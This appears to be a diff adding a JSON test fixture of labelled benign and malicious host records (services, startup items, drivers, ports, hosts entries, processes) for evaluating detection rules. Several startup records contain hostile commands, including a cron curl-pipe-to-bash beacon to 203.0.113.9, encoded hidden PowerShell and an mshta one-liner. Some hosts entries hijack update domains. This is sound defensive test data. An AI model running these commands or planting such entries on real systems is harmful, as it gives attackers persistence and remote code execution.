@@ -1,0 +1,725 @@
+{
+  "description": "Hand-labelled benign and suspicious records for experiment E4. Benign items include real software known to resemble attacker behaviour; suspicious items are modelled on public ATT&CK procedure examples. Labels are ground truth, independent of the rules.",
+  "records": [
+    {
+      "source": "services",
+      "record": {
+        "name": "sshd.service",
+        "executable": "/usr/sbin/sshd",
+        "binary_path": "/usr/sbin/sshd -D"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "OpenSSH"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "cron.service",
+        "executable": "/usr/sbin/cron",
+        "binary_path": "/usr/sbin/cron -f"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "cron daemon"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "wuauserv",
+        "executable": "C:\\WINDOWS\\system32\\svchost.exe",
+        "binary_path": "C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Windows Update"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "ZoomCptService",
+        "executable": "C:\\Program Files\\Common Files\\Zoom\\Support\\CptService.exe",
+        "binary_path": "\"C:\\Program Files\\Common Files\\Zoom\\Support\\CptService.exe\" -user_path \"C:\\Users\\u\\AppData\\Roaming\\Zoom\""
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Zoom; AppData only in an argument"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "GoogleUpdaterService",
+        "executable": "C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe",
+        "binary_path": "\"C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe\" --system --windows-service"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Google updater"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "TeamsUpdate",
+        "executable": "C:\\Users\\amy\\AppData\\Roaming\\Teams\\Update.exe",
+        "binary_path": "C:\\Users\\amy\\AppData\\Roaming\\Teams\\Update.exe --service"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Per-user updater in AppData (known benign FP)"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "dbus-update.service",
+        "executable": "/dev/shm/.dbus/upd",
+        "binary_path": "/dev/shm/.dbus/upd --daemon"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-001"
+      ],
+      "note": "Payload in /dev/shm masquerading as dbus"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "kworker.service",
+        "executable": "/tmp/.ICE-unix/kworker",
+        "binary_path": "/tmp/.ICE-unix/kworker"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-001"
+      ],
+      "note": "Hidden temp folder service"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "WinDefendUpdate",
+        "executable": "C:\\Windows\\Temp\\wdupd.exe",
+        "binary_path": "C:\\Windows\\Temp\\wdupd.exe"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-001"
+      ],
+      "note": "Service binary in Windows\\Temp"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "PrintSpoolerHelper",
+        "executable": "C:\\Users\\Public\\spool.exe",
+        "binary_path": "C:\\Users\\Public\\spool.exe -s"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-001"
+      ],
+      "note": "Service in Users\\Public"
+    },
+    {
+      "source": "services",
+      "record": {
+        "name": "svchostx",
+        "executable": "C:\\ProgramData\\svchostx.exe",
+        "binary_path": "C:\\ProgramData\\svchostx.exe"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-001"
+      ],
+      "note": "Masquerade in ProgramData (rule does not cover it: expected FN)"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "SecurityHealth",
+        "command": "%windir%\\system32\\SecurityHealthSystray.exe"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Windows Security tray"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "OneDrive",
+        "command": "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "OneDrive"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "crontab",
+        "command": "cd / && run-parts --report /etc/cron.hourly",
+        "schedule": "17 * * * *"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Debian hourly cron"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "logrotate",
+        "command": "test -x /usr/sbin/logrotate && /usr/sbin/logrotate /etc/logrotate.conf"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "logrotate"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "certbot",
+        "command": "test -x /usr/bin/certbot && perl -e 'sleep int(rand(43200))' && certbot -q renew"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "certbot renew"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "netdata-updater",
+        "command": "curl -fsSL https://my-netdata.io/kickstart.sh -o /opt/netdata-kickstart.sh"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Vendor self-update with curl (known benign FP)"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "Updater",
+        "command": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-002"
+      ],
+      "note": "Encoded PowerShell in Run key"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "alice",
+        "command": "*/5 * * * * curl -s http://203.0.113.9/x.sh | bash"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-002"
+      ],
+      "note": "Cron pipe-to-bash beacon"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "rc.local",
+        "command": "/dev/shm/.x/agent &"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-002"
+      ],
+      "note": "rc.local starts payload from /dev/shm"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "WinUpdate",
+        "command": "mshta vbscript:Execute(CreateObject(WScript.Shell).Run)"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-002"
+      ],
+      "note": "mshta in Run key"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "sync.desktop",
+        "command": "C:\\Users\\bob\\AppData\\Local\\Temp\\sync.exe"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-002"
+      ],
+      "note": "Startup item in Temp"
+    },
+    {
+      "source": "startup",
+      "record": {
+        "name": "helper",
+        "command": "C:\\ProgramData\\helper\\helper.exe --silent"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-002"
+      ],
+      "note": "Plain binary in ProgramData (no rule signal: expected FN)"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "e1000",
+        "unsigned": false,
+        "out_of_tree": false
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Intel NIC module"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "ext4",
+        "unsigned": false,
+        "out_of_tree": false
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "ext4"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "nvidia",
+        "unsigned": false,
+        "out_of_tree": true,
+        "taint_flags": "PO"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "NVIDIA proprietary (known benign FP)"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "vboxdrv",
+        "unsigned": true,
+        "out_of_tree": true,
+        "taint_flags": "OE"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "VirtualBox DKMS (known benign FP)"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "diamorphine",
+        "unsigned": true,
+        "out_of_tree": true,
+        "taint_flags": "OE"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-003"
+      ],
+      "note": "Diamorphine LKM rootkit"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "reptile_module",
+        "unsigned": true,
+        "out_of_tree": true,
+        "taint_flags": "OE"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-003"
+      ],
+      "note": "Reptile rootkit"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "disk",
+        "driver_type": "kernel_driver",
+        "image_path": "System32\\drivers\\disk.sys"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Windows disk driver"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "Ntfs",
+        "driver_type": "file_system_driver",
+        "image_path": "\\SystemRoot\\System32\\Drivers\\Ntfs.sys"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "NTFS"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "nvlddmkm",
+        "driver_type": "kernel_driver",
+        "image_path": "\\SystemRoot\\System32\\DriverStore\\FileRepository\\nv_dispi.inf_amd64\\nvlddmkm.sys"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "NVIDIA display driver in DriverStore"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "VBoxSup",
+        "driver_type": "kernel_driver",
+        "image_path": "\\??\\C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VBoxSup.sys"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "VirtualBox driver in Program Files (known benign FP)"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "gdrv",
+        "driver_type": "kernel_driver",
+        "image_path": "C:\\Users\\Public\\gdrv.sys"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-004"
+      ],
+      "note": "Vulnerable Gigabyte driver dropped for BYOVD"
+    },
+    {
+      "source": "drivers",
+      "record": {
+        "name": "RTCore64",
+        "driver_type": "kernel_driver",
+        "image_path": "C:\\Windows\\Temp\\RTCore64.sys"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-004"
+      ],
+      "note": "MSI Afterburner driver abused for BYOVD"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 22,
+        "address": "0.0.0.0",
+        "process_name": "sshd"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "SSH"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 443,
+        "address": "0.0.0.0",
+        "process_name": "nginx"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "HTTPS"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 135,
+        "address": "0.0.0.0",
+        "process_name": "svchost.exe"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "RPC endpoint mapper"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 5432,
+        "address": "127.0.0.1",
+        "process_name": "postgres"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "PostgreSQL"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 5555,
+        "address": "127.0.0.1",
+        "process_name": "adb"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Android Debug Bridge (known benign FP)"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 4444,
+        "address": "0.0.0.0",
+        "process_name": "update.exe"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-005"
+      ],
+      "note": "Metasploit default listener"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 31337,
+        "address": "0.0.0.0",
+        "process_name": "x"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-005"
+      ],
+      "note": "Classic backdoor port"
+    },
+    {
+      "source": "listening_ports",
+      "record": {
+        "protocol": "TCP",
+        "port": 8443,
+        "address": "0.0.0.0",
+        "process_name": "beacon"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-005"
+      ],
+      "note": "C2 on a common HTTPS-alt port (expected FN)"
+    },
+    {
+      "source": "dns",
+      "record": {
+        "kind": "nameserver",
+        "value": "1.1.1.1"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Cloudflare resolver"
+    },
+    {
+      "source": "dns",
+      "record": {
+        "kind": "hosts_entry",
+        "value": "127.0.0.1",
+        "names": [
+          "localhost"
+        ]
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "localhost"
+    },
+    {
+      "source": "dns",
+      "record": {
+        "kind": "hosts_entry",
+        "value": "0.0.0.0",
+        "names": [
+          "telemetry.microsoft.com"
+        ]
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Telemetry blocked by user"
+    },
+    {
+      "source": "dns",
+      "record": {
+        "kind": "hosts_entry",
+        "value": "10.0.0.5",
+        "names": [
+          "intranet.corp.local"
+        ]
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Internal host pin"
+    },
+    {
+      "source": "dns",
+      "record": {
+        "kind": "hosts_entry",
+        "value": "203.0.113.9",
+        "names": [
+          "update.microsoft.com"
+        ]
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-006"
+      ],
+      "note": "Update hijack"
+    },
+    {
+      "source": "dns",
+      "record": {
+        "kind": "hosts_entry",
+        "value": "198.51.100.4",
+        "names": [
+          "security.ubuntu.com"
+        ]
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-006"
+      ],
+      "note": "APT update hijack"
+    },
+    {
+      "source": "dns",
+      "record": {
+        "kind": "hosts_entry",
+        "value": "198.51.100.7",
+        "names": [
+          "www.virustotal.com"
+        ]
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-006"
+      ],
+      "note": "Blinding a security service"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 4000,
+        "ppid": 1,
+        "name": "chrome.exe",
+        "exe": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Chrome"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 4001,
+        "ppid": 4000,
+        "name": "cmd.exe",
+        "exe": "C:\\Windows\\System32\\cmd.exe"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Chrome native-messaging helper"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 4100,
+        "ppid": 1,
+        "name": "setup.exe",
+        "exe": "C:\\Users\\amy\\AppData\\Local\\Temp\\7zS1A2.tmp\\setup.exe"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Installer unpacked in Temp (known benign FP)"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 4200,
+        "ppid": 1,
+        "name": "python3",
+        "exe": "/usr/bin/python3.12"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Python"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 5000,
+        "ppid": 1,
+        "name": "WINWORD.EXE",
+        "exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      },
+      "malicious": false,
+      "expected_rules": [],
+      "note": "Word"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 5001,
+        "ppid": 5000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-008"
+      ],
+      "note": "Word macro spawning PowerShell"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 5100,
+        "ppid": 1,
+        "name": "invoice.exe",
+        "exe": "C:\\Users\\bob\\AppData\\Local\\Temp\\invoice.exe"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-007"
+      ],
+      "note": "Dropper in Temp"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 5200,
+        "ppid": 1,
+        "name": "kdevtmpfsi",
+        "exe": "/tmp/kdevtmpfsi"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-007"
+      ],
+      "note": "Kinsing cryptominer"
+    },
+    {
+      "source": "processes",
+      "record": {
+        "pid": 5300,
+        "ppid": 1,
+        "name": "svch0st.exe",
+        "exe": "C:\\Windows\\svch0st.exe"
+      },
+      "malicious": true,
+      "expected_rules": [
+        "JKY-DET-007"
+      ],
+      "note": "Typosquatted name in Windows folder (expected FN)"
+    }
+  ]
+}
